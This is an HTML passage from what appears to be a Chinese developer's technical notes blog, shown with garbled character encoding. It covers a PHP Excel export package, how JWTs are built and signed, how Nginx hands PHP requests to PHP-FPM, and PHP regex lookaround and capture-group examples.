PhpOffice\PhpSpreadsheet\Writer\Xls;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Writer\Xlsx;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Writer\Csv;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¯¼å‡ºå¯¼å…¥Excel</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Class Excel</span></span><br><span class="line"><span class="comment"> * @package jianyan\excel</span></span><br><span class="line"><span class="comment"> * @author jianyan74 &lt;751393839@qq.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Excel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">composer <span class="built_in">require</span> jianyan74/php-excel</span><br><span class="line"></span><br><span class="line">use jianyan\excel\Excel;</span><br><span class="line">Excel::exportData($list, $header)</span><br></pre></td></tr></table></figure>
<h3 id="jwtè®°å½•"><a href="#jwtè®°å½•" class="headerlink" title="jwtè®°å½•"></a>jwtè®°å½•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">JWT ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šå¤´éƒ¨ã€æ•°æ®ä½“ã€ç­¾å / åŠ å¯†</span><br><span class="line"></span><br><span class="line">è¿™ä¸‰éƒ¨åˆ†ä»¥ . (è‹±æ–‡å¥å·) è¿æ¥ï¼Œæ³¨æ„è¿™ä¸‰éƒ¨åˆ†é¡ºåºæ˜¯å›ºå®šçš„ï¼Œå³ header.payload.signature å¦‚ä¸‹ç¤ºä¾‹ï¼š</span><br><span class="line"></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br><span class="line"></span><br><span class="line">Base64url ç¼–ç æ˜¯ Base64 çš„ä¸€ç§é’ˆå¯¹ URL çš„ç‰¹å®šå˜ç§ã€‚å› ä¸º = ã€+ã€/ è¿™ä¸ªä¸‰ä¸ªå­—ç¬¦åœ¨ URL ä¸­æ˜¯æœ‰ç‰¹å®šå«ä¹‰çš„ï¼Œæ‰€ä»¥ Base64url åˆ†åˆ«å°† = ç›´æ¥å¿½ç•¥ï¼Œ+ æ›¿æ¢æˆ -ï¼Œ/ æ›¿æ¢æˆ _</span><br><span class="line">Header éƒ¨åˆ†ï¼š</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="string">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br><span class="line">Payload éƒ¨åˆ†ï¼š</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"sub"</span>: <span class="string">"demo"</span>,</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"xfly"</span>,</span><br><span class="line">  <span class="string">"admin"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">æ ¹æ® Header éƒ¨åˆ†çš„ alg å±æ€§æˆ‘ä»¬å¯ä»¥çŸ¥é“è¯¥ JWT ç¬¦åˆ JWS ä¸­çš„è§„èŒƒï¼Œä¸”ç­¾åç®—æ³•æ˜¯ HS256 ä¹Ÿå°±æ˜¯ HMAC SHA<span class="number">-256</span> ç®—æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®å¦‚ä¸‹å…¬å¼è®¡ç®—æœ€åçš„ç­¾åéƒ¨åˆ†ï¼š</span><br><span class="line"></span><br><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">"."</span> +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret</span><br><span class="line">)</span><br><span class="line">å…¶ä¸­çš„å¯†é’¥æ˜¯ä¿è¯ç­¾åå®‰å…¨æ€§çš„å…³é”®ï¼Œæ‰€ä»¥å¿…é¡»ä¿å­˜å¥½ï¼Œåœ¨æœ¬ä¾‹ä¸­å¯†é’¥æ˜¯ <span class="number">123456</span>ã€‚å› ä¸ºæœ‰è¿™ä¸ªå¯†é’¥çš„å­˜åœ¨ï¼Œæ‰€ä»¥å³ä¾¿è°ƒç”¨æ–¹å·å·çš„ä¿®æ”¹äº†å‰ä¸¤éƒ¨åˆ†çš„å†…å®¹ï¼Œåœ¨éªŒè¯ç¯èŠ‚å°±ä¼šå‡ºç°ç­¾åä¸ä¸€è‡´çš„æƒ…å†µï¼Œæ‰€ä»¥ä¿è¯äº†å®‰å…¨æ€§ã€‚</span><br><span class="line">å¦‚æœæœ‰æ•ˆæœŸè®¾ç½®è¿‡é•¿ï¼Œæ„å‘³ç€è¿™ä¸ª Token æ³„æ¼åå¯ä»¥è¢«é•¿æœŸåˆ©ç”¨ï¼Œå±å®³è¾ƒå¤§ï¼Œæ‰€ä»¥ä¸€èˆ¬æˆ‘ä»¬éƒ½ä¼šè®¾ç½®ä¸€ä¸ªè¾ƒçŸ­çš„æœ‰æ•ˆæœŸã€‚ç”±äºæœ‰æ•ˆæœŸè¾ƒçŸ­ï¼Œæ„å‘³ç€éœ€è¦ç»å¸¸è¿›è¡Œé‡æ–°æˆæƒçš„æ“ä½œã€‚</span><br><span class="line">å‡è®¾åœ¨ç”¨æˆ·æ“ä½œè¿‡ç¨‹ä¸­å‡çº§ / å˜æ›´äº†æŸäº›æƒé™ï¼ŒåŠ¿å¿…éœ€è¦åˆ·æ–°ä»¥æ›´æ–°æ•°æ®ã€‚</span><br><span class="line">è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦åœ¨æœåŠ¡ç«¯éƒ¨ç½²é¢å¤–é€»è¾‘ï¼Œå¸¸è§çš„åšæ³•æ˜¯å¢åŠ åˆ·æ–°æœºåˆ¶å’Œé»‘åå•æœºåˆ¶ï¼Œé€šè¿‡ Refresh Token åˆ·æ–° JWTï¼Œå°†éœ€è¦åºŸå¼ƒçš„ Token åŠ å…¥åˆ°é»‘åå•ã€‚</span><br><span class="line">ç®€å•ç§‘æ™®ä¸‹éå¯¹ç§°å¼åŠ å¯†ç®—æ³•ï¼šæœ‰ä¸¤ä¸ªå¯†é’¥ï¼Œä¸€ä¸ªå…¬å¼€å¯†é’¥å’Œä¸€ä¸ªç§æœ‰å¯†é’¥ï¼Œç§é’¥å‚ä¸åŠ å¯†ï¼Œå…¬é’¥ç”¨äºè§£å¯†ï¼Œå·§å¦™ä¹‹å¤„æ˜¯è§£å¯†åªèƒ½ç”¨å…¬é’¥æ¥è§£ï¼Œå³ä¾¿æ˜¯åŠ å¯†ç”¨çš„å¯†é’¥ä¹Ÿæ— æ³•å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†ã€‚ä½ å¯ä»¥çœ‹åˆ°åŠ å¯†å’Œè§£å¯†éœ€è¦ä¸¤ä¸ªä¸åŒçš„å¯†é’¥ï¼Œæ•…ç§°ä¹‹ä¸ºéå¯¹ç§°åŠ å¯†ã€‚</span><br><span class="line">https:<span class="comment">//learnku.com/articles/28909#reply91329</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-FPM-åˆ›å»ºæ…¢æ—¥å¿—"><a href="#PHP-FPM-åˆ›å»ºæ…¢æ—¥å¿—" class="headerlink" title="PHP-FPM åˆ›å»ºæ…¢æ—¥å¿—"></a>PHP-FPM åˆ›å»ºæ…¢æ—¥å¿—</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">CGI: æ˜¯ä¸€ä¸ªåè®®ï¼Œè§„å®šäº† Web æœåŠ¡å™¨å’Œåç«¯è¯­è¨€çš„äº¤äº’ã€‚ä½†æ˜¯æ€§èƒ½å·®ç‚¹ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½ä¼š fork ä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚\</span><br><span class="line">FastCGI: ä¹Ÿæ˜¯ä¸€ä¸ªåè®®ï¼Œæ˜¯ CGI çš„å‡çº§ç‰ˆï¼Œå¯ä»¥åœ¨ä¸€ä¸ªè¿›ç¨‹å†…å¤„ç†å¤šä¸ªè¯·æ±‚ \</span><br><span class="line">FPMï¼šFastCGI è¿›ç¨‹ç®¡ç†å™¨ï¼Œæ˜¯ä¸€ä¸ªå®ç°äº† FastCGI åè®®çš„å·¥å…· \</span><br><span class="line">PHP-FPM: æ˜¯ä¸€ä¸ª PHP çš„è¿›ç¨‹ç®¡ç†å™¨ï¼Œä¸“é—¨ç»™ PHP ä½¿ç”¨çš„ FPM å·¥å…· \</span><br><span class="line"></span><br><span class="line"> Nginx å¹¶ä¸æ˜¯ç›´æ¥å’Œ PHP è¿›è¡Œé€šä¿¡çš„ï¼Œè€Œæ˜¯é€šè¿‡ PHP-FPMã€‚Nginx ä¸ä»…ä»…æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ Web æœåŠ¡å™¨ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¼ºå¤§çš„ä»£ç†æœåŠ¡å™¨ï¼Œæä¾›äº†å¾ˆå¤šè¯·æ±‚åè®®çš„ä»£ç†ã€‚æ¯”å¦‚ Http åè®®è¿˜æœ‰ FastCgi åè®®ç­‰ã€‚</span><br><span class="line"></span><br><span class="line">å½“è¯·æ±‚è¿›å…¥åˆ° Nginx ä¸­ï¼ŒNginx æä¾›äº†ä¸€ä¸ª FastCgi æ¨¡å— æ¥æŠŠ Http è¯·æ±‚æ˜ å°„ä¸ºå¯¹åº”çš„ Fastcgi è¯·æ±‚ã€‚è¯¥æ¨¡å—æä¾›äº† fastcgi_param æŒ‡å®šæ¥å®Œæˆæ˜ å°„å…³ç³»ã€‚å®ƒçš„ä¸»è¦ä½œç”¨å°±æ˜¯æŠŠ Nginx ä¸­çš„å˜é‡ç¿»è¯‘æˆ PHP ä¸­èƒ½å¤Ÿç†è§£çš„å˜é‡ã€‚ ä¸€èˆ¬è¯¥æ–‡ä»¶æ˜¯åœ¨ Nginx çš„å®‰è£…ç›®å½•ä¸‹ï¼Œæˆ‘çš„å†…å®¹å¦‚ä¸‹:</span><br><span class="line"></span><br><span class="line">/etc/nginx # cat /etc/nginx/fastcgi_params </span><br><span class="line"></span><br><span class="line">fastcgi_param  QUERY_STRING       $query_string;</span><br><span class="line">fastcgi_param  REQUEST_METHOD     $request_method;</span><br><span class="line">fastcgi_param  CONTENT_TYPE       $content_type;</span><br><span class="line"></span><br><span class="line">.php ç»“å°¾çš„è¯·æ±‚éƒ½äº¤ç»™ fastcgi æ¨¡å—å¤„ç†ï¼Œç„¶åæŠŠå¤„ç†åçš„è¯·æ±‚å‘é€ç»™ PHP-FPMï¼Œç„¶å PHP-FPM æŠŠè¯·æ±‚äº¤ç»™ worker è¿›ç¨‹ï¼Œworker è¿›ç¨‹åŠ è½½ PHP è§£æå™¨è¿è¡Œ PHP å¤„ç†ç»“æœã€‚ å…¶ä¸­ fastcgi_pass unix:<span class="regexp">/var/</span>run/php/php7<span class="number">.1</span>-fpm.sock; è¿™ä¸€è¡Œç”¨æ¥æŒ‡å®š fpm çš„åœ°å€</span><br><span class="line"></span><br><span class="line">Nginx å’Œ PHP çš„é€šä¿¡æµç¨‹å¤§æ¦‚å¦‚ä¸‹ã€‚</span><br><span class="line"></span><br><span class="line">å®¢æˆ·ç«¯å‘é€è¯·æ±‚åˆ° Nginx</span><br><span class="line">åŠ è½½ nginx.conf æ–‡ä»¶ï¼ŒæŠŠæ‰€æœ‰ .php ç»“å°¾çš„è¯·æ±‚ç‰¹æ®Šå¤„ç†</span><br><span class="line">åŠ è½½ FastCGI æ¨¡å—ï¼Œå®Œæˆè¯·æ±‚å‚æ•°çš„è§£ææ˜ å°„ï¼Œç”Ÿæˆ FastCGI è¯·æ±‚</span><br><span class="line">ç„¶åé€šè¿‡ fastcgi_pass å‚æ•°æŠŠ FastCGI è¯·æ±‚å‘é€ç»™ PHP-FPM å¤„ç†</span><br><span class="line">PHP-FPM æ”¶åˆ°è¯·æ±‚ï¼Œåˆ†é…ç»™ç©ºé—² worker å­è¿›ç¨‹</span><br><span class="line">worker å­è¿›ç¨‹åŠ è½½ PHP è§£æå™¨ç­‰ å®Œæˆ PHP æ‰§è¡Œè·å–ç»“æœ</span><br><span class="line">PHP-FPM æ˜¯ä¸€ç§ master/worker è¿›ç¨‹æ¶æ„ã€‚é¦–å…ˆä¼šå¯åŠ¨ä¸€ä¸ª master ä¸»è¿›ç¨‹ï¼Œä¸»è¦åŠŸèƒ½ç”¨æ¥å®Œæˆ PHP ç¯å¢ƒçš„åˆå§‹åŒ–ï¼Œäº‹ä»¶ç›‘å¬ï¼Œå­è¿›ç¨‹çŠ¶æ€ç®¡ç†ç­‰ç­‰ã€‚ç„¶åä¼šå¯åŠ¨è‹¥å¹² worker å­è¿›ç¨‹æ¥å¤„ç† PHP è¯·æ±‚</span><br><span class="line">æµ‹è¯• php-fpm é…ç½®å†…å®¹æ˜¯å¦æ­£ç¡® ä½¿ç”¨ -t å‚æ•°ï¼Œ è¿˜å¯ä»¥é€šè¿‡åŠ  -c æŒ‡å®š php.ini æ–‡ä»¶ï¼Œé€šè¿‡ -y æŒ‡å®š php-fpm.conf</span><br><span class="line">find / -name php-fpm7</span><br><span class="line">/etc/init.d/php-fpm7</span><br><span class="line">/etc/logrotate.d/php-fpm7</span><br><span class="line">/usr/sbin/php-fpm7</span><br><span class="line"></span><br><span class="line">/usr/sbin/php-fpm7 -c /usr/local/php/etc/php.ini -y /usr/local/php/etc/php-fpm.conf -t</span><br><span class="line"></span><br><span class="line">å»çœ‹ PHP-FPM çš„é”™è¯¯æ—¥å¿—ã€‚åœ¨ php-fpm.conf ä¸­å¢åŠ  error_log = <span class="regexp">/xx/</span>xx/php-fpm.error.log, ç„¶åé‡å¯ PHP-FPMï¼Œåœ¨è®¿é—®æµ‹è¯•è¿æ¥è¯·æ±‚ï¼Œå‘ç°æœç„¶æœ‰æŠ¥é”™</span><br><span class="line"></span><br><span class="line">[<span class="number">17</span>-May<span class="number">-2019</span> <span class="number">10</span>:<span class="number">04</span>:<span class="number">50</span>] NOTICE: fpm is running, pid <span class="number">12</span></span><br><span class="line">[<span class="number">17</span>-May<span class="number">-2019</span> <span class="number">10</span>:<span class="number">04</span>:<span class="number">50</span>] NOTICE: ready to handle connections</span><br><span class="line">[<span class="number">17</span>-May<span class="number">-2019</span> <span class="number">10</span>:<span class="number">05</span>:<span class="number">04</span>] ERROR: failed to ptrace(ATTACH) child <span class="number">22</span>: Operation not permitted (<span class="number">1</span>)</span><br><span class="line">[<span class="number">17</span>-May<span class="number">-2019</span> <span class="number">10</span>:<span class="number">05</span>:<span class="number">04</span>] WARNING: [pool www123] child <span class="number">22</span>, script <span class="string">'/app/www/public/index.php'</span> (request: <span class="string">"GET /index.php"</span>) executing too slow (<span class="number">2.317563</span> sec), logging</span><br><span class="line">æ˜¾ç¤ºå­è¿›ç¨‹æƒé™ä¸å¤Ÿï¼Œptrace è°ƒç”¨å¤±è´¥ï¼  master è¿›ç¨‹ä¸ºäº†ç›‘æ§å­è¿›ç¨‹éœ€è¦è°ƒç”¨ ptrace æ¥å®ç°å¯¹å­è¿›ç¨‹ç›‘æ§å’Œè¿½è¸ªï¼Œä½†æ˜¯è°ƒç”¨ ptrace å´å¤±è´¥äº†  https:<span class="comment">//learnku.com/articles/28683</span></span><br></pre></td></tr></table></figure>
<h3 id="æ­£åˆ™è¡¨è¾¾å¼ä¹‹éš¾ç‚¹"><a href="#æ­£åˆ™è¡¨è¾¾å¼ä¹‹éš¾ç‚¹" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼ä¹‹éš¾ç‚¹"></a>æ­£åˆ™è¡¨è¾¾å¼ä¹‹éš¾ç‚¹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">æ–­è¨€ ?&lt;= è¿™ä¸ªæ˜¯å¯¹éœ€è¦åŒ¹é…çš„ç›®æ ‡å·¦è¾¹çš„ï¼ˆå‰é¢ï¼‰çš„è¿›è¡Œæ–­è¨€ï¼Œæ–­å®šå®ƒå‰é¢ä¼šå‡ºç°çš„ ä½†æ˜¯ä¸ä¼šè¢«åŒ¹é…åˆ°ã€‚å¦‚ï¼š</span><br><span class="line">$subject = 'I am Lancer, Please say hello Lancer';</span><br><span class="line"></span><br><span class="line">//ç›®æ ‡ï¼š æˆ‘è¦æŠŠhello åé¢çš„Lancer  æ”¹ä¸º  '!' .</span><br><span class="line">$pattern = '/(?&lt;=hello )Lancer/';</span><br><span class="line">$result = preg_replace($pattern, '', $subject);</span><br><span class="line">echo $result;  //I am Lancer, Please say hello !</span><br><span class="line">è¿™æ ·å°±æˆåŠŸå’¯~</span><br><span class="line">?=,ä¸ä¸Šé¢çš„ä½ç½®åˆšå¥½ç›¸åï¼Œè¿™ä¸ªæ˜¯å¯¹éœ€è¦åŒ¹é…çš„ç›®æ ‡å³è¾¹çš„ï¼ˆåé¢ï¼‰çš„è¿›è¡Œæ–­è¨€ï¼Œæ–­å®šå®ƒåé¢ä¼šå‡ºç°çš„ ä½†æ˜¯ä¸ä¼šè¢«åŒ¹é…åˆ°ã€‚å¦‚ï¼š</span><br><span class="line">$subject = 'I love you! I love her too!';</span><br><span class="line"></span><br><span class="line">//ç›®æ ‡ï¼šä¸èƒ½çˆ±è¿™ä¹ˆå¤šï¼Œ æŠŠç¬¬äºŒä¸ª 'love' æ”¹ä¸º 'hate'</span><br><span class="line">$pattern = '/love(?= her)/';</span><br><span class="line">$result = preg_replace($pattern, 'hate', $subject);</span><br><span class="line">echo $result;  //'I love you! I hate her too!'</span><br><span class="line">?&lt;!è¿™ä¸ªæ˜¯éœ€è¦å¯¹åŒ¹é…å·¦è¾¹çš„ï¼ˆå‰é¢çš„ï¼‰è¿›è¡Œæ–­è¨€ï¼Œä¸è¿‡å®ƒæ˜¯éï¼Œæ‰¾åˆ°ä¸æ˜¯è¿™ä¸ªçš„ã€‚è¿˜æ˜¯æ‹¿ç¬¬ä¸€ä¸ªä¾‹å­æ¥è¯´ï¼š</span><br><span class="line">$subject = 'I am Lancer, Please say hello Lancer';</span><br><span class="line"></span><br><span class="line">//ç›®æ ‡ï¼š æˆ‘è¿˜æ˜¯è¦æŠŠhello åé¢çš„Lancer  æ”¹ä¸º  '!'  è¯¥æ€ä¹ˆåš</span><br><span class="line">$pattern = '/(?&lt;!am )Lancer/';  //æ‰¾åˆ°â€˜Lancerâ€™å‰é¢ä¸æ˜¯'am 'çš„'Lancer'</span><br><span class="line">$result = preg_replace($pattern, '', $subject);</span><br><span class="line">echo $result;  //I am Lancer, Please say hello !</span><br><span class="line">?!è¿˜æ˜¯ä¸€æ ·çš„ç§˜æ–¹ï¼Œè¿˜æ˜¯ä¸€æ ·çš„å‘³é“~</span><br><span class="line">$subject = 'I love you! I love her too!';</span><br><span class="line"></span><br><span class="line">//ç›®æ ‡ï¼šä¸èƒ½çˆ±è¿™ä¹ˆå¤šï¼Œ æŠŠç¬¬äºŒä¸ª 'love' æ”¹ä¸º 'hate'</span><br><span class="line">$pattern = '/love(?! you)/';</span><br><span class="line">$result = preg_replace($pattern, 'hate', $subject);</span><br><span class="line">echo $result;  //'I love you! I hate her too!'</span><br><span class="line">æ€»ç»“ï¼šè¿™ä¸ªæ–­è¨€ï¼Œä½œç”¨ä¸»è¦åœ¨ï¼Œå¯¹äºå¾ˆå¤šåŒæ ·çš„ç›®æ ‡ï¼Œå¯æ˜¯æˆ‘åªè¦å…¶ä¸­çš„ä¸€ä¸ªï¼Œæˆ–è€…å¤šä¸ªçš„æ—¶å€™ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ ¹æ®å®ƒçš„å‰é¢å’Œåé¢ï¼Œè¿›è¡Œæ–­è¨€ï¼Œæ¥åŒºåˆ†ä»–ä»¬æ‰¾åˆ°è‡ªå·±æƒ³è¦åŒ¹é…çš„ç›®æ ‡ã€‚</span><br><span class="line">æ•è· å…ˆæ¥è¯´ä¸€ä¸‹ï¼Œ ä»€ä¹ˆå«æ•è·ã€‚å°±æ˜¯åŒ¹é…ä¹‹åï¼Œä¼šæ ¹æ®ä½ æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ï¼ˆï¼‰æ¥è¿›è¡Œåˆ†ç»„ã€‚ä¸€ä¸€æ•è·ã€‚æ‰“ä¸ªæ¯”æ–¹ï¼š</span><br><span class="line">//ä¸ºäº†æ˜¾ç¤ºæ–¹ä¾¿ï¼Œå†™äº†ä¸ªshowå‡½æ•°</span><br><span class="line">function show($str)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($str)) &#123;</span><br><span class="line">        echo null;</span><br><span class="line">    &#125; elseif (is_array($str) || is_object($str)) &#123;</span><br><span class="line">        echo '&lt;pre&gt;';</span><br><span class="line">        print_r($str);</span><br><span class="line">        echo '&lt;/pre&gt;';</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo $str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//--------------------------------------------------------------------</span><br><span class="line">$subject  = '12323abcdea1233';</span><br><span class="line">$pattern = '/(a)(b)(c)(d)(e)/';</span><br><span class="line">preg_match_all($pattern, $subject, $matches);</span><br><span class="line">show($matches);&gt;&gt;&gt; $matches   </span><br><span class="line">               =&gt; [           </span><br><span class="line">                    [         </span><br><span class="line">                      "abcde",</span><br><span class="line">                    ],        </span><br><span class="line">                    [         </span><br><span class="line">                      "a",    </span><br><span class="line">                    ],        </span><br><span class="line">                    [         </span><br><span class="line">                      "b",    </span><br><span class="line">                    ],        </span><br><span class="line">                    [         </span><br><span class="line">                      "c",    </span><br><span class="line">                    ],        </span><br><span class="line">                    [         </span><br><span class="line">                      "d",    </span><br><span class="line">                    ],        </span><br><span class="line">                    [         </span><br><span class="line">                      "e",    </span><br><span class="line">                    ],        </span><br><span class="line">                  ]           </span><br><span class="line">//è¿™ä¸ªç­”æ¡ˆï¼Œå¤§å®¶åº”è¯¥éƒ½çŸ¥é“å§ã€‚ç´¢å¼•ä¸º0çš„æ˜¯æ•´ä¸ªmatchçš„å†…å®¹ï¼Œæ¥ç€çš„</span><br><span class="line">//å°±æ˜¯æ•è·çš„æ¯ä¸€ä¸ªï¼ˆï¼‰åˆ†ç»„çš„å†…å®¹ã€‚æˆ‘ä»¬è¿˜å¯ä»¥è¿™æ ·æ¥å†™ï¼š</span><br><span class="line"></span><br><span class="line">$subject = '123abcabc123';</span><br><span class="line">$pattern = '/(a)(b)(c)(\1)(\2)(\3)/';</span><br><span class="line">preg_match_all($pattern, $subject, $matches);</span><br><span class="line">show($matches);//??</span><br><span class="line">å…ˆçœ‹ç­”æ¡ˆï¼š</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; abcabc</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [1] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; a</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [2] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; b</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [3] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; c</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [4] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; a</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [5] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; b</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [6] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; c</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">//ä½ å¯èƒ½ä¼šæœ‰ç–‘é—®ï¼Œ å’¦,,, æ€ä¹ˆ(\1)å’Œ(a)ï¼Œ (\2)å’Œ(b)ï¼Œ(\3)å’Œ(c) åœ¨æ­£åˆ™é‡Œæ˜¯ä¸€æ ·çš„å‘¢ï¼Ÿ</span><br><span class="line">//å…¶å® (a)å°±æ˜¯æŒ‡çš„ç¬¬ä¸€ç»„, ç„¶ååé¢å°±å¯ä»¥ç”¨(\1)æ¥è¡¨ç¤ºã€‚(b),(c)ä¹Ÿä¸€æ ·ã€‚</span><br><span 